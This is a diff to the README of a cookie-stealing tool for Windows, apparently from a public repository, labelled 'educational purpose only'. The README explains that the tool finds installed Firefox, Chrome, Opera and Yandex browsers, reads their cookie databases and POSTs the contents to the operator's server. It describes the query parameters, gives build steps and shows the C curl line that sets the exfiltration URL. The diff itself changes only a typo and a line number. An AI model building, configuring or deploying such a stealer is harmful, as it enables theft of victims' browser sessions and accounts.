@@ -3,7 +3,7 @@ Complete raw cookie stealer for MS Windows. Educational purpose only. Have runti
 
 Working principe just pretty simple: first checks what browsers are currently installed on the local machine. There is only four variants for now *(Firefox, Chrome, Opera, Yandex)*, then reads their cookie file databases and sends content to your server through API requests. Really simple, huh.
 
-If you want to build your own binary, click ![here](https://github.com/vulpes-solis/cguilt#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of imcoming params, click ![here](https://github.com/vulpes-solis/cguilt#query-template).
+If you want to build your own binary, click ![here](https://github.com/vulpes-solis/cguilt#build). You also you need a serverside to accept incoming POST requests with some query params in it. To check the template of incoming params, click ![here](https://github.com/vulpes-solis/cguilt#query-template).
 
 ## query template
 In incoming API requests query schema has three parametrs:
@@ -12,7 +12,7 @@ In incoming API requests query schema has three parametrs:
 3. `b_type`. Browser type. Not exactly every browsers here, but only Chromium in general (= 1) and Gecko (= 2).
 
 ## build
-Install `libcurl` and `sqlite3` libs. Before compilation change destination server adress in 40th string in `send.c`:
+Install `libcurl` and `sqlite3` libs. Before compilation change destination server adress in 55th string in `send.c`:
 ```c
 curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/api_post");
 ```
